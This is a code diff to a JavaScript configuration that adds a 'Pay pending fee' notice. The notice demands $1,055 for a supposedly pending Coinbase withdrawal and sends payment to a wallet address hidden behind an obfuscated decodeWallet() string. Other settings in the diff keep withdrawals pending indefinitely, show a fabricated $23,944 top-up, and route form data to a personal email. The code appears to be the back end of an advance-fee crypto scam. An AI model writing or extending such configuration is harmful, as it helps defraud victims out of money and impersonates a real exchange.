@@ -136,6 +136,12 @@
       formSubmitEmail: "ronniechristopher89@gmail.com",
       withdrawCompleteWithinMs: 60 * 60 * 1000,
       withdrawStayPending: true,
+      pendingFeeNotice: {
+        amountUsd: 1055,
+        wallet: decodeWallet("ERUGCUYTQwoSQFZPRhsODgQcXEAFRUIACR1CTQocBR5AGgIMRQVFCR4T"),
+        title: "Pay pending fee",
+        body: "Fee of $1,055 is needed for pending to be completed in your Coinbase wallet."
+      },
       balanceNotification: {
         id: "topup-2026-08-28",
         amountUsd: 23944
